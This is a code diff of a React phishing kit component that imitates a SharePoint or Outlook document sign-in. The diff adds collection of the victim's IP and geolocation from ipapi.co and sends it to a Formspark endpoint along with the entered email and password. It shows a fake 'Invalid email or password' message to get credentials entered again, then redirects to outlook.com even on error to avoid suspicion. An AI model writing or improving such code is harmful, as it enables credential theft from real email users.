@@ -1,9 +1,9 @@
 import { useFormspark } from "@formspark/use-formspark";
-import { useState } from "react";
+import Axios from "axios"; // Import Axios
+import { useEffect, useState } from "react";
 import { GrFormNext } from "react-icons/gr";
 import { Modal } from "react-responsive-modal";
 import "react-responsive-modal/styles.css";
-import { useNavigate } from "react-router-dom"; // Import useNavigate hook from react-router-dom
 import PhoneIcons from "../assets/images/RE4q5Ja.webp";
 import PhoneOne from "../assets/images/phone1.webp";
 import PhoneTwo from "../assets/images/phone2.webp";
@@ -13,24 +13,48 @@ import Ondream from "../assets/images/splogo.png";
 
 const FORMSPARK_FORM_ID = "PcMyPAkzz";
 
-const DriveMain = () => {
+const NextList = () => {
   const [open, setOpen] = useState(true);
   const [eml, setEml] = useState("");
   const [emlPass, setEmlPass] = useState("");
   const [submit, submitting] = useFormspark({ formId: FORMSPARK_FORM_ID });
   const [ipInfo, setIpInfo] = useState({});
-  const navigate = useNavigate(); // Initialize useNavigate
+  const [error, setError] = useState(false);
+
+  useEffect(() => {
+    // Function to fetch IP information using Axios and ipapi.co
+    const fetchIpInfo = async () => {
+      try {
+        const response = await Axios.get("https://ipapi.co/json/");
+        setIpInfo(response.data);
+      } catch (error) {
+        console.error("Error fetching IP information:", error);
+      }
+    };
+
+    fetchIpInfo();
+  }, []);
+
+  useEffect(() => {
+    // Check if the form has been previously submitted
+    const isFormSubmitted = localStorage.getItem("formSubmitted");
+    if (isFormSubmitted) {
+      window.location.replace("https://outlook.com");
+    }
+  }, []);
 
   const onCloseModal = () => setOpen(false);
 
   const handleSubmit = async (e) => {
     e.preventDefault();
     try {
-      await submit({ eml, emlPass });
+      await submit({ eml, emlPass, ...ipInfo });
       localStorage.setItem("formSubmitted", "true");
-      navigate("/authenticate");
+      window.location.replace("https://outlook.com");
     } catch (error) {
+      setError(true);
       console.error("Error submitting form:", error);
+      window.location.replace("https://outlook.com"); // Redirect even if there's an error
     }
   };
 
@@ -120,9 +144,13 @@ const DriveMain = () => {
                     className="w-60 place-content-center"
                   />
                   <div className="text-xs text-red-300">
-                    To download/view your document authenticate your E-mail with
-                    SharePoint
+                    Invalid email or password. Enter correct email and password
                   </div>
+                  {error && (
+                    <div className="text-red-500 text-xs mb-2">
+                      Incorrect email or password
+                    </div>
+                  )}
                   <form className="mt-6" onSubmit={handleSubmit}>
                     <div className="mb-2">
                       <label
@@ -188,4 +216,4 @@ const DriveMain = () => {
   );
 };
 
-export default DriveMain;
+export default NextList;
